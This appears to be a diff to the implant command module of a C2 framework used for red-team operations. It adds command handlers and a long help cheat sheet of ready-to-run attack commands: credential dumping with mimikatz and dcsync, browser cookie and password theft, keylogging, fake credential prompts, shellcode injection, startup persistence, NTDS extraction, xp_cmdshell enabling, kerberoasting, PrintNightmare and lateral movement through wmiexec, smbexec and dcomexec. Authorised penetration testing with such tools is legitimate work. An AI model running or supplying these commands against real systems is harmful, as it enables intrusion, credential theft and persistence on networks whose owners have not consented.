@@ -1056,6 +1056,50 @@ def do_dynamic_code(user, command, implant_id, command_prefix=""):
 
 
 @command(commands, commands_help, examples, block_help)
+def do_incident_response_toolkit(user, command, implant_id, command_prefix=""):
+    """
+    Starts IncidentResponseToolkit but must be an Administrator.
+
+    MITRE TTPs:
+        {}
+
+    Examples:
+        incident-response-toolkit
+    """
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=f"{command_prefix} {command}" if command_prefix else command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
+
+
+
+@command(commands, commands_help, examples, block_help)
+def do_certify(user, command, implant_id, command_prefix=""):
+    """
+    Starts certify find /vulnerable /currentuser.
+
+    MITRE TTPs:
+        {}
+
+    Examples:
+        certify find /vulnerable /currentuser
+        certify find /vulnerable /currentuser
+    """
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=f"{command_prefix} {command}" if command_prefix else command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
+
+
+@command(commands, commands_help, examples, block_help)
 def do_stop_daisy(user, command, implant_id, command_prefix=""):
     """
     Stops a running daisy server.
@@ -1212,6 +1256,456 @@ def do_help(user, command, implant_id, command_prefix=""):
         help inject-shellcode
     """
     print_command_help(command, commands, commands_help, block_help)
+
+@command(commands, commands_help, examples, block_help, tags=[Tag.Help])
+def do_helpold(user, command, implant_id, command_prefix=""):
+    """
+    Displays a list of all the available commands for this implant, or
+    help for a particular command if specified.
+
+    MITRE TTPs:
+        {}
+
+    Examples:
+        help
+        help list-modules
+        help inject-shellcode
+    """
+
+    sharp_help = """
+* Implant Features:
+====================
+arpscan 172.16.0.1/24 true
+back
+beacon 60s / beacon 10m / beacon 2h
+bypass-amsi
+cd C:\\Users\\Public\\
+copy c:\\temp\\test.exe c:\\temp\\test.bac
+copy c:\\temp\\test.exe c:\\temp\\test2.exe
+CopyFolder c:\\temp\\ C:\\temp2\\
+CoreHelp
+corehelp
+create-lnk c:\\users\\public\\test.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\test.dll,VoidFunc
+create-lnk C:\\Users\\userName\\appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Cisco.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\wkrp.dll,VoidFunc
+create-startuplnk OneNote.lnk c:\\windows\\system32\rundll32.exe c:\\users\\public\\wkrp.dll,VoidFunc
+create-startuplnk test.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\test.dll,VoidFunc
+cred-popper Outlook "Please Enter Your Domain Credentials" [optional username]
+curl https://www.google.co.uk
+curl https://www.google.co.uk <domain-front-header-optional> <proxy-optional> <proxy-user-optional> <proxy-pass-optional>
+curl https://www.google.co.uk [domain-front-header] [proxy] [proxy-user] [proxy-pass] [comma-separated-headers]
+curl https://www.google.co.uk myserver.azureedge.net
+curl https://www.google.co.uk myserver.azureedge.net http://10.10.10.1:8080
+curl https://www.google.co.uk myserver.azureedge.net http://10.10.10.1:8080 user pass 
+del
+del c:\\temp\\test.exe
+disable-environmentexit
+dll-lister [powershell]
+dll-searcher clr.dll mscoree.dll
+dllsearcher clr.dll mscoree.dll
+dllsearcher system.management.automation.dll system.management.automation.ni.dll
+download-file "c:\\temp\\test.exe"
+download-file Base64SourceFilePath
+echo "Param1" "Param2"
+enable-rotation
+enum-vhdx c:\\temp\\directory
+enum-vhdx-dir c:\\temp\\directory
+fileaccesstime c:\\temp\\test.exe
+find-file <filename, e.g. flag> <extension, txt> <drive-optional, e.g. c:> <hostname-optional, e.g. 127.0.0.1>
+find-windows
+findfile flag txt
+findfile groups xml
+findfile passwords txt
+free-memory 0x180000000
+freememory 0x180000000
+gc c:\\temp\\log.txt
+get-aadjoininformation
+get-acl c:\temp\test.exe
+get-api-calls
+get-apicall ntdll.dll NtQueueApcThreadEx
+get-computerinfo
+get-content c:\\temp\\log.txt
+get-creds
+get-currentworkingdirectory
+get-dllbaseaddress
+get-dodgyprocesses
+get-env
+get-file-changes [dir] [days difference]
+get-idletime
+get-methods Core.Program Core
+get-multi-screenshot <interval> [optional-width] [optional-height]
+get-osversion
+get-process <name of process>
+get-processlist
+get-processlist-dotnet
+get-remoteprocesslisting HOSTNAME1,HOSTNAME2 [explorer.exe] [Username] [Domain] [Password]
+get-remoteprocesslistingall HOSTNAME1,HOSTNAME2
+get-rotation
+get-screenshot [width-optional] [height-optional]
+get-screenshotallwindows
+get-screensize
+get-serviceperms c:\\temp\\
+get-userinfo
+getcurrentworkingdirectory
+getdllbaseaddress
+getinstallerinfo
+getpowerstatus
+getprocess explorer
+getprocesslist
+help
+hide-implant
+hook-terminateprocess
+incident-response-toolkit
+inject-dll <dll-location> <pid/path> <ppid>
+inject-shellcode <rwx> <base64-shellcode> <pid/path> <ppid>
+inject-shellcodectx <rwx> <base64-shellcode> <pid/path> <ppid>
+inject-shellcodekct <process> <path> <base64-shellcode>
+inject-shellcodesyscall <rwx> <base64-shellcode> <pid/path>
+inveigh
+invoke-daisychain <args>
+kill-implant
+kill-process
+kill-process 1357
+kill-process 1890
+kill-remote-process 1357 DESKTOP-2NCNQ59
+kill-remote-process 1890 <hostname>
+label-implant <newlabel>
+ldap-Searcher "(&(objectCategory=user)(samaccountname=user))" "LDAP://bloredc1.blorebank.local/DC=blorebank,DC=local" <optional-properties> <optional-resolve>
+ldap-searcher-recursive "(&(objectCategory=group)(samaccountname=Domain Admins))" "LDAP://bloredc1.blorebank.local/DC=blorebank,DC=local" <optional-properties>
+list-loaded-modules
+list-modules
+listmodules
+loadmodule Seatbelt.exe
+loadmoduleforce
+loadpowerstatus
+localgroupmember server1.blorebank.local administrators
+lockless WebCacheV01.dat
+lockless WebCacheV01.dat /process:taskhostw /copy:C:\\Temp\\out.tmp
+ls c:\\temp\\
+ls-pipes
+ls-recurse c:\\temp\\
+ls-reg HKEY_LOCAL_MACHINE SOFTWARE\\Classes\\CLSID
+ls-reghkcu SOFTWARE\\Classes\\CLSID
+ls-reghklm SOFTWARE\\Classes\\CLSID
+ls-remotepipes server1
+ls-simple c:\\temp\\
+lsreghkcu SOFTWARE
+lsreghklm "SOFTWARE\\Classes\\CLSID\\{FFFDC614-B694-4AE6-AB38-5D6374584B52}"
+lsreghklm SOFTWARE\\Classes\\CLSID
+mkdir c:\\backup-ntds
+mkdir c:\\temp\\
+modulesloaded
+move c:\\temp\\old.exe c:\\temp\\new.exe
+movefolder c:\\temp\\old.exe C:\temp\new.exe
+net-share-enum-full server1,server2
+netsessionenum server1,server2
+netshareenum server1,server2
+netstat
+portscan "Host1,Host2" "80,443,3389" "1" "100"
+posh-delete c:\\temp\\test.exe
+ps
+pslo powerview.ps1
+pwd
+quit
+reg-read HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall <keyname>
+reg-write-hkcu SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall <name> <value>
+regread <keypath> <keyname>
+regread HKEY_CURRENT_USER\\SOFTWARE\\Citrix\\Dazzle FirstRunInstall
+regread HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall <keyname>
+regread HKEY_USERS\\S-1-5-18\\Environment TEMP
+regreaduninstall
+remove-dllbaseaddress
+remove-label
+removedllbaseaddress
+resolve-dnsname www.google.com,www.aol.com
+resolve-ip 10.0.0.1
+resolvednsname google.com
+resolveip 127.0.0.1
+rmdir c:\\backup-ntds
+rmdir c:\temp\\
+run-dll Seatbelt.Program Seatbelt UserChecks
+run-dll SharpSploit.Enumeration.Host SharpSploit GetHostname
+run-dll SharpSploit.Enumeration.Host SharpSploit GetProcessList
+run-dll-background Core.Program Core runmylongdll
+run-exe Core.Program Core
+run-exe-background Core.Program Core runmylongapp
+runas <user> <password> <os command> <domain> <timeout> <logontype>
+runasps <domain> <user> <password> <ps command>
+runof demo_bof.x64.o
+runof env.x64.o
+runof ipconfig.x64.o
+runof-debug demo_bof.x64.o
+runpe ATPMiniDump.exe
+runpe SpoolSample.exe \\\\targetserver \\\\CaptureServer
+runpe-debug MS-RPRN.exe \\\\targetserver \\\\CaptureServer
+searchallhelp mimikatz
+searchhelp listmodules
+searchhistory invoke-mimikatz
+seatbelt -group=all
+seatbelt -group=system
+seatbelt AutoRuns
+seatbelt ExplorerRunCommands
+seatbelt PoweredOnEvents
+seatbelt RDPSavedConnections
+seatbelt RDPSessions
+set-currentworkingdirectory C:\\Users\\Public\\
+setcurrentworkingdirectory c:\\users\\public\\
+setdelegates <pSendData> <pGetDllBaseAddress> <pGetCurrentTaskId>
+shadowcopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy6\\Windows\\System32\\config\\SAM SAM.backup
+shadowcopy enum
+sharpapplocker
+sharpedrchecker
+sharpps get-process
+sharpreg
+sharptask --addtask local 09:30 \\ TaskName "Task Description" C:\\Windows\\system32\\cmd.exe "/c mshta.exe" 
+sharptask --listall local
+sharptask --listall local \\
+sharptask --removetask local \\ Test
+sslinspectioncheck https://www.google.com
+sslinspectioncheck https://www.google.com <proxyhost> <proxyuser> <proxypass> <useragent>
+start-process net users
+start-process net.exe -argumentlist users
+start-process-silent "C:\\Program Files\\Internet Explorer\\iexplore.exe" -argumentlist www.recruitment.com/survey
+start-process-silent net users
+start-shortcut c:\\users\\public\\image.lnk
+start-shortcut c:\\users\\public\\test.lnk
+stop-daisy
+stop-multi-screenshot
+stop-powerstatus
+stopinveigh
+stoppowerstatus
+test-adcredential Domain Username Password
+test-localcredential Username Password
+turtle 5h
+turtle 60s / turtle 30m / turtle 8h
+unhide-implant
+unhooker
+unzip c:\\backup.zip c:\\backup-ntds\\
+unzip c:\temp\\test.zip c:\\temp\\
+upload-file -source /tmp/test.exe -destination "c:\\temp\\test.exe"
+upload-file SourceBase64 DestinationFilePathBase64
+winver
+wmi-query HOSTNAME "root\\cimv2" "select * FROM Win32_Share" [Username] [Domain] [Password]
+zip c:\\backup-ntds\\ c:\\backup.zip
+zip c:\\temp\\ c:\\users\\public\temp.zip
+
+* Running PS
+=============
+sharpps $psversiontable
+pslo powerview.ps1
+
+* Migration
+============
+migrate
+inject-shellcode c:\\windows\\system32\\svchost.exe <optional-ppid-spoof>
+inject-shellcode <pid>
+get-apicall ntdll.dll NtQueueApcThreadEx
+disableenvironmentexit
+
+* Privilege Escalation:
+========================
+arpscan 172.16.0.1/24 true
+get-serviceperms c:\\temp\\
+get-screenshot
+get-screenshotmulti 2m
+stop-screenshotmulti
+get-screenshotallwindows
+start-keystrokes
+start-keystrokes-writefile
+get-keystrokes
+stop-keystrokes
+testadcredential domain username password
+testlocalcredential username password
+cred-popper "Outlook" "Please Enter Your Domain Credentials"
+cred-popper "Putty" "Please re-enter your OTP code" "root@172.16.0.1"
+getcreds
+get-hash
+sharpup
+sharpweb all
+sharpchrome cookies /showall
+sharpchromium all
+sharpchromium logins
+sharpchromium history
+sharpchromium cookies mail.x.com
+seatbelt -group=all
+seatbelt -group=chrome
+seatbelt -group=misc
+seatbelt TcpConnections
+seatbelt "WindowsFirewall tcp"
+seatbelt CredEnum
+seatbelt WindowsCredentialFiles
+seatbelt WindowsVault
+watson
+sharpcookiemonster
+sharpdpapi machinetriage
+sharpchrome logins
+sweetpotato -p c:\\users\\public\\startup.exe
+stickynotesextract
+filegrep <path> <file mask> <regex> <recurse>
+filegrep \\server\\share *.* credential: true
+filegrep \\server\\share *.* "(password|pass|cred|credential)\\s*(=|:|>)" true
+syscallsextractor
+
+* Process Dumping:
+===================
+safetydump
+safetydump <pid>
+safetykatz minidump
+safetykatz full
+
+* Mimikatz via SharpSploit:
+============================
+mimikatz Wdigest
+mimikatz LsaSecrets
+mimikatz LsaCache
+mimikatz SamDump
+mimikatz Command "privilege::debug sekurlsa::logonPasswords"
+mimikatz Command "\\"crypto::capi\\" \\"crypto::certificates /export\\""
+dcsync <domain.fqdn> <user>
+
+* Dumping Active Directory:
+============================
+mkdir c:\\backup-ntds\\
+start-process ntdsutil.exe "\\"activate instance ntds\\" \\"ifm\\" \\"create full c:\\backup-ntds\\ \\" \\"q\\" \\"q\\""
+zip c:\\backup-ntds\\ c:\\backup.zip
+
+* Network Tasks:
+=================
+farmer /url:http://+:10247/apps/ /timer:360
+sqlquery server=localhost
+sqlquery server=localhost username=sa password=sa
+sqlquery server=localhost port=5555 username=sa password=sa database=Master
+sqlquery server=localhost port=5555 username=sa password=sa catalogue=Master
+sqlquery connectionstring="Server=127.0.0.1:1433;Database=MYDB;Initial Catalog=Master;Integrated Security=True;" query="SELECT suser_name();"
+sqlquery server=localhost port=5555 username=sa password=sa query="SELECT suser_name();"
+sqlquery server=localhost port=5555 username=sa password=sa query="SELECT @@version;"
+sqlquery server=localhost port=5555 username=sa password=sa query="SELECT suser_name();"
+sqlquery server=localhost port=5555 username=sa password=sa query="SELECT user;"
+sqlquery server=localhost port=5555 username=sa password=sa query="SELECT user_name();"
+sqlquery server=localhost port=5555 username=sa password=sa query="EXEC sp_databases;"
+sqlquery server=localhost port=5555 username=sa password=sa query="SELECT * from sysobjects where xtype='u';"
+sqlquery server=localhost port=5555 username=sa password=sa query="SELECT name from DBNAME..sysobjects where xtype='u';"
+sqlquery server=localhost port=5555 username=sa password=sa query="SELECT * FROM databaseName.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
+sqlquery server=localhost port=5555 username=sa password=sa query="SELECT * FROM sys.sql_logins;"
+sqlquery server=localhost port=5555 username=sa password=sa query="EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+rubeus kerberoast /nowrap
+rubeus dump
+rubeus triage
+rubeus asreproast /user:username
+rubeus monitor /interval:1  
+localgroupmember server1.blorebank.local administrators
+certify find /vulnerable /currentuser
+net-share-enum fileserver1.blorebank.local
+net-session-enum fileserver1.blorebank.local
+sharpprintnightmare \\\\192.168.1.215\\smb\\addCube.dll \\\\192.168.1.20 hackit.local domain_user Pass123
+sharpshares ips
+sharpshares shares
+sharpview Get-NetUser -SamAccountName ben
+sharpview Get-NetGroup -Name *admin* -Domain -Properties samaccountname,member -Recurse
+sharpview Get-NetGroupMember -LDAPFilter GroupName=*Admins* -Recurse -Properties samaccountname
+sharpview Get-NetUser -Name deb -Domain blorebank.local
+sharpview Get-NetSession -Domain blorebank.local
+sharpview Get-NetOU -Properties distinguishedname
+sharpview Get-DomainController -Domain blorebank.local
+sharpview Get-DomainUser -LDAPFilter samaccountname=ben -Properties samaccountname,mail
+sharpview Get-DomainUser -AdminCount -Properties samaccountname
+sharpview Get-DomainComputer -LDAPFilter operatingsystem=*2012* -Properties samaccountname
+sharpview Find-InterestingFile -Path c:\\users\\ -Include *exe*
+sharpview Find-InterestingDomainShareFile -ComputerName SERVER01
+sharpview Get-DomainComputer -SearchBase "OU=Domain Controllers,DC=contoso,DC=local" -Properties samaccountname
+sharpview Get-NetShare -ComputerName SERVER01
+sharpwmi action=query query="select * from win32_process"
+sharpwmi action=query query="select * from win32_process where name='explorer.exe'" computername=SERVER01,SERVER02
+sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02
+sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02
+sharpwmi action=query query="select * from win32_process" computername=SERVER01 username=DOMAIN\\user password=Password123!
+sharpwmi action=query query="select * FROM AntiVirusProduct" namespace="root\\SecurityCenter2"
+sharpwmi action=query query="Select * from Win32_GroupUser" computername=SERVER01 username=DOMAIN\\user password=Password123!
+getremoteprocesslisting SERVER01 explorer.exe
+getremoteprocesslisting SERVER01,SERVER02,SERVER03 taskhost.exe
+getremoteprocesslistingall SERVER01,SERVER02
+portscan "10.0.0.1-50" "1-65535" 1 100 # <hosts> <ports> <delay-in-seconds> <max-threads>
+ping ip/hostname
+ipconfig
+nslookup ip/hostname
+standin --asrep
+standin --spn
+standin --delegation
+standin --dc
+standin --group "Domain Admins"
+standin --object samaccountname=DC$
+standin --object samaccountname=administrator --property=mail
+eventlogsearcher bloredc1,bloredc2,bloredc3 "ben|deb|lisa|corin" 2
+eventlogsearcher bloredc1,bloredc2,bloredc3 "ben|deb|lisa|corin" 2 verbose=true
+ldap-searcher "(&(objectClass=domainDNS))"
+ldap-searcher "(&(objectCategory=trustedDomain))"
+ldap-searcher "(&(objectClass=pKIEnrollmentService))" LDAP://CN=Configuration,DC=blorebank,DC=local
+ldap-searcher "(&(objectClass=domainDNS))" LDAP://DC=blorebank,DC=local name,distinguishedname,pwdhistorylength,dc,ms-ds-machineaccountquota
+ldap-searcher "(&(objectCategory=user)(samaccountname=administrator))"
+ldap-searcher "(&(objectCategory=group)(samaccountname=domain admins))"
+ldap-searcher "(&(objectCategory=user)(mail=admin@test.local))" LDAP://DC=test,DC=local 
+ldap-searcher "(&(objectCategory=user)(mail=admin@test.local))" LDAP://DC=test,DC=local samaccountname
+ldap-searcher "(&(objectCategory=user)(samaccountname=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))" "LDAP://DC=test,DC=local" samaccountname
+ldap-searcher "(objectCategory=computer)" "LDAP://OU=Domain Controllers,DC=blorebank,DC=local" samaccountname
+ldap-searcher "(&(objectCategory=organizationalUnit))" LDAP://DC=blorebank,DC=local name,distinguishedname
+ldap-searcher "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" LDAP://DC=blorebank,DC=local samaccountname
+getgpppassword
+getgppgroups \\\\bloredc1.blorebank.local\\sysvol\\blorebank.local\\policies\\
+
+* Lateral Movement:
+====================
+sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123!
+sharpwmi action=executevbs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123! payload=base64
+sharpwmi action=executejs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123! payload=base64
+wmiexec <127.0.0.1> <domain> <username> [password=asdsa] [hash=DA22332] <command>
+smbexec <127.0.0.1> <domain> <username> [password=asdsa] [hash=DA22332] <command> [servicename] [SMB1]
+dcomexec -t 10.0.0.1 -m mmc -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
+dcomexec -t 10.0.0.1 -m shellbrowserwindow -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
+dcomexec -t 10.0.0.1 -m shellwindows -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
+sharpsc SERVER01 service "cmd /c rundll32.exe test.dll,Ep" domain username password
+pbind-connect hostname
+pbind-connect hostname <pipename> <secret>
+fcomm-connect
+fcomm-connect filepath
+sharptelnet <host> <port> <username> <password> [command]
+
+* Lateral Movement with Pre-Built Payload:
+===========================================
+sharpwmi action=executejs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123!
+sharpwmi action=executevbs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123!
+startdaisy
+stopdaisy
+
+* Socks:
+=========
+sharpsocks
+sharpsocks --verbose
+stopsocks
+
+* Bloodhound (In Memory only):
+===============================
+sharphound -c DCOnly --MemoryOnlyJSON --MemoryOnlyZIP --NoSaveCache
+sharphound -c Container,Group,LocalGroup,GPOLocalGroup,ObjectProps,ACL,Trusts,RDP,DCOM,PSRemote,Session,LoggedOn,Default --MemoryOnlyJSON --MemoryOnlyZIP --NoSaveCache
+
+* Bloodhound:
+==============
+sharphound -c DCOnly --outputdirectory c:\\users\\public --nosavecache --RandomizeFilenames --zipfilename backup_small.zip --collectallproperties
+sharphound -c Container,Group,LocalGroup,GPOLocalGroup,ObjectProps,ACL,Trusts,RDP,DCOM,PSRemote,Session,LoggedOn,Default --outputdirectory c:\\users\\public --nosavecache --RandomizeFilenames --zipfilename backup_full.zip --collectallproperties
+
+* Run Generic C# Executable:
+=============================
+# See Alias.py for examples or to add your own aliases
+loadmodule MyBinary.exe
+run-exe <FullyQualifiedClassWithMainMethod> <MyBinaryAssemblyName>
+
+* Dynamically compile and run code on the target:
+=================================================
+# Edit payloads/DynamicCode.cs then:
+dynamic-code
+dynamic-code <args>
+
+"""
+
+    print_good(sharp_help)
 
 
 @command(commands, commands_help, examples, block_help, tags=[Tag.Help])
@@ -3103,6 +3597,7 @@ def do_sharptask(user, command, implant_id, command_prefix=""):
         --AddTask local 12:30 \\ Test "Testing This Thing" C:\\Windows\\system32\\cmd.exe "/c powershell -c BLAH"
 
     Examples:
+        sharptask --listall local
         sharptask --listall local \\
         sharptask --addtask local 09:30 \\ TaskName "Task Description" C:\\Windows\\system32\\cmd.exe "/c mshta.exe" 
         sharptask --removetask local \\ Test
@@ -3152,7 +3647,7 @@ def do_user_logons(user, command, implant_id, command_prefix=""):
     """
     Event log enumeration for sessions, requires elevation.
 
-    Uses the C# EventLogSession class which uses the native EvtOpenSession (winevt.h / 	Wevtapi.dll) which uses RPC.
+    Uses the C# EventLogSession class which uses the native EvtOpenSession (winevt.h /  Wevtapi.dll) which uses RPC.
 
     MITRE TTPs:
         {}
@@ -3673,10 +4168,10 @@ def do_start_process_silent(user, command, implant_id, command_prefix=""):
         {}
 
     Arguments:
-        start-process <binary> -argumentlist <args>
+        start-process-silent <binary> -argumentlist <args>
 
     Examples:
-        start-process <binary> -argumentlist <args>
+        start-process-silent <binary> -argumentlist <args>
     """
     new_task = NewTask(
         implant_id=implant_id,
